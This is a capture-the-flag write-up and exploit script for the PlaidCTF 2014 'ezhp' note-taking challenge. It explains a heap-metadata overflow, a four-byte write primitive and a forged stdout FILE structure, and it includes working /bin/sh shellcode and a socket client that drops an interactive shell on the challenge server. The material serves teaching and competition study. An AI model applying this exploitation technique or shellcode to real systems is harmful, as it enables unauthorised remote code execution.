#!/usr/bin/python

import time
import socket
import struct
import telnetlib

""" 
    mike_pizza
    PlaidCTF 2014 ezhp writeup 
    (also a small introduction to heapoverflows)

    This challenge presented a simple note-taking program with 
    an interactive menu. You could add notes, change the contents
    of notes, remove notes, and print notes. 
    
    --[ Heap Allocation:

    To store data about the notes, the application was using the 
    sbrk(2) system call. This is the underlying system call which 
    powers the heap allocator, malloc. This application stores 
    information on the heap, but implements its own heap-allocation 
    algorithm. A heap-allocator typically tries to limit the number 
    of times it has to call sbrk(2) because of the system call's poor 
    performance. To do this a heap-allocator will use some
    binning system to organize large chunks of space returned by
    sbrk(2). The binning system will allow the programmer to 
    free memory up for reuse without having to make expensive 
    calls to sbrk(2) in the future.
    
    It does this by creating 'bin's for data. With each of these
    bins, some metadata is stored which describes the bin. This
    particular heap allocator used by the note-taking program
    stores information about the bin size, the address of the next
    bin, and the address of the previous bin.

    So after a call to a heap-allocator we'll have something like
    this in the room sbrk(2) allocated for us:

    +---------------------+
    | size of this bin    |
    +---------------------+
    | pointer to next bin |
    +---------------------+
    | pointer to prev bin |
    +---------------------+
    |                     |
    | room for data ....  |
    |                     |
    +---------------------+

    After many calls to the heap-allocator we'll have many 
    consecutive bins in the memory allocated by sbrk(2). 

    | 25 | *bin-2 | NULL   | "tunnel snakes rule" ... 
    | 35 | *bin-3 | *bin-1 | "passwd:fullmetaltaxidermist" ... 
    | 25 | NULL   | *bin-2 | "seinfeld occulus rift" ...

    As you can see, the bins are stringed together via a linked
    list represented through the meta-data of each bin. Now when
    when a free occurs the linked list must be updated.

    Say we free the second bin. We need to update both bin-1 and
    bin-3 with new pointer information to maintain the linked list.

    You can express this operation in high-level C with the following
    code:

    void
    free(void *addr)
    {
        uin32_t *prevblock, *nextblock, *block_to_free; 

        /* decrement to the metadata */
        block_to_free = addr - 12; 

        prevblock = block_to_free->prev 
        nextblock = block_to_free->next

        prevblock->next = nextblock;
        nextblock->prev = prevblock;
    }

    (note: there are a few more details involved, but they are for the most
    part irrelevant for the purpose of the exploit)  

    --[ Exploiting the Heap Allocator:

    Now taking a look back at the binary's behavior we can spot an easy 
    overflow oppurtunity.

    We can create a note, when creating a note you are asked for a size.
    We keep this size in mind when picking the next option. We can now
    choose the 'Change note' option. This option asks for a note index
    (starting at 0), a size of the content to be read in, and content
    itself. As you can see, an easy overflow exists. Simply create a 
    new note with size 'x'. Now change the note specifying a content 
    size greater than 'x'.

    With this we can overwrite the heap meta-data which is associated with
    every bin! Knowing how the heap-allocator frees memory we can use our
    overflow to write four bytes into the binary. 


    Bin 0 | size
          | next
          | prev
          |  \    Overflow into Bin 1 
          |  /
          |  \
          |  /
    Bin 1 |  \    Overwriting Bin 1 metadata
          |  /
          |  \
          |  /
          |  v
          | 's'
          | 's'
          | 'w'
          | 'o'

    
    To do this we can place the addresses we want to write into the subsequent 
    bin's meta-data header, we then free the bin to cause the writes to occur. 
    You can reference the function do_arbwrite() below to see how precisely this
    is done, there is a small amount of adjustment that needs to be 
    performed on the desired 'write-to' address due to the offsets within 
    the bin structure, you can reference the function do_arbwrite() below
    to see these. Also note that despite the function name, the value you
    write is not arbitrary, both values must point to valid, writeable, 
    addresses.

    --[ Write Four Bytes Where?

    Even with a four byte write primitive we are still limited in what we 
    can do. The target system was configured with system-wide ASLR, and
    the binary was compiled with 'RELRO' 
    (see http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html).
    The target system was 32bit x86 without PaX protections so every page
    was executable, meaning we can write shellcode into the heap, but it's
    still difficult finding function pointers to overwrite in the binary.
    The GOT is read-only and the juicy looking function-pointer table the
    program uses to do command handling is unfortunately read-only. One
    could attempt to find an address to the stack or bruteforce it, but I
    had no luck with that.

    However, something interesting about the binary is its use of fflush().
    The function fflush() takes a FILE * as an argument. Disassembling
    fflush reveals an enticing instruction:

        call *0x30(eax)

    Following this I saw that eax was taken out of the stdout object existing
    in memory and the location of the stdout object was controlled by a single
    address in hardcoded location! 

    --[ The Exploit

    This exploit hijacks the stdout structure pointer in the FILE 
    stream struct. The value it hijacks it with is a pointer to a 
    forged stdout structure which itself contains a pointer to our 
    shellcode. We place this forged stdout stucture just past the 
    global malloc pointer. When everything is in place the upper 
    region of memory should look like this:

                      +----(shellcodeptr - 0x30)<---+
                      |                             |
                      v                             |
    | mallocptr | shellcode | forged stdout ... write ptr
                                ^
                                |
    FILE <stdout>               |
    | ptr to forged stdout -----+

    now when fflush is called on the hijacked FILE stream a shell will
    drop!
"""

mallocptr  = 0x804b060
tableptr   = 0x804a060
fileobjptr = 0x804a040

shellcodeptrptr = mallocptr + 4 
shellcodeptr    = mallocptr + 8

# execve("/bin/sh") shellcode from Jean Pascal Pereira
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" +\
            "\x68\x68\x2f\x62\x69\x6e\x89" +\
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" +\
            "\xcd\x80\x31\xc0\x40\xcd\x80"

# a pointer to a valid memory region
encode_valid = struct.pack("I", fileobjptr + 8)

encode_shellcodeptrptr = struct.pack("I", shellcodeptrptr)
encode_shellcodeptr    = struct.pack("I", shellcodeptr)

# a forged stdout struct
# offset 72 must point to valid memory
fstdout = "\x84\x2a\xad\xfb" + "\x00\xb0\xfd\xb7" +\
	  "\x00\xb0\xfd\xb7" + "\x00\xb0\xfd\xb7" +\
	  encode_shellcodeptr + ("\x00" * 4) +\
   	  ("\x00" * 4)       + ("\x00" * 4) +\
	  ("\x00" * 4)	     + "\x20\x7c\xfc\xb7" +\
	  "\x01\x00\x00\x00" + ("\x00" * 4) +\
	  ("\xff" * 4)	     + ("\x00" * 4) +\
	  "\x78\x88\xfc\xb7" + ("\xff" * 4) +\
	  ("\xff" * 4)       + ("\x00" * 4) +\
          encode_valid       + ("\x00" * 4) +\
	  ("\x00" * 4)       + ("\x00" * 4) +\
	  ("\xff" * 4)	     + ("\x00" * 4) +\
	  ("\x00" * 8) +\
	  ("\x00" * 8) +\
	  ("\x00" * 4)       + encode_shellcodeptrptr +\
	  (encode_shellcodeptrptr * 8)

mesgcount = 0

def do_read(s):
	data = s.recv(1024)
	return data

def do_write(s, string):
	s.send(string + "\n")	
	

def add_mesg(s):
	global mesgcount

	do_read(s)	
	do_write(s, "1")
	do_read(s)	
	do_write(s, "20")

	mesgcount += 1

	return mesgcount-1

def del_mesg(s, n):
	global mesgcount

	do_read(s)
	do_write(s, "2")
	do_read(s)
	do_write(s, str(n))

	mesgcount -= 1

def write_mesg(s, n, mesg):
	do_read(s)	
	do_write(s, "3")
	do_read(s)
	do_write(s, str(n))
	do_read(s)
	do_write(s, str(len(mesg)+4))
	do_read(s)
	do_write(s, mesg)

def print_mesg(s, n):
	do_read(s)
	do_write(s, "4")
	do_read(s)
	do_write(s, str(n))

	return do_read(s)

# write the four byte value val to address addr
# as a consquence addr - 4 will also be written 
# to the address at value + 8
def do_arbwrite(s, mesg1, mesg2, val, addr):
	cap = ("A" * 24) + "\x25\x00\x00\x00"

	first  = mesg1
	second = mesg2
	
	addr -= 4
	encode_val  = struct.pack("I", val)
	encode_addr = struct.pack("I", addr)

	payload = cap + encode_val + encode_addr
	print "payload length", len(payload)
	print payload
	write_mesg(s, first, payload)
	del_mesg(s, second)

def main():
	global mallocptr
	global tableptr
	global shellcode
	global fileobjptr
	global fstdout
	
	#s = socket.create_connection(("localhost", 6969))
	s = socket.create_connection(("54.81.149.239",9174))
		
	shellcodeptr = mallocptr + 4
	# redirect mesg 0 pointer
	add_mesg(s) # 0
	add_mesg(s) # 1
	add_mesg(s) # 2
	add_mesg(s) # 3
	add_mesg(s) # 4

	print "[+] redirecting message 0 to shellcode/forged stdout..."
	do_arbwrite(s, 0, 1, shellcodeptr, tableptr)

	print "[+] writing shellcode..."

	encode_min30 = struct.pack("I", (shellcodeptr - 0x30) + 0x4)

	# write our shellcode to the redirected message zero
	write_mesg(s, 0, encode_min30 + shellcode + fstdout) 

	print "[+] redirecting filestream object..."
	do_arbwrite(s, 3, 4, shellcodeptr + len(encode_min30 + shellcode) , fileobjptr)

	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

main()
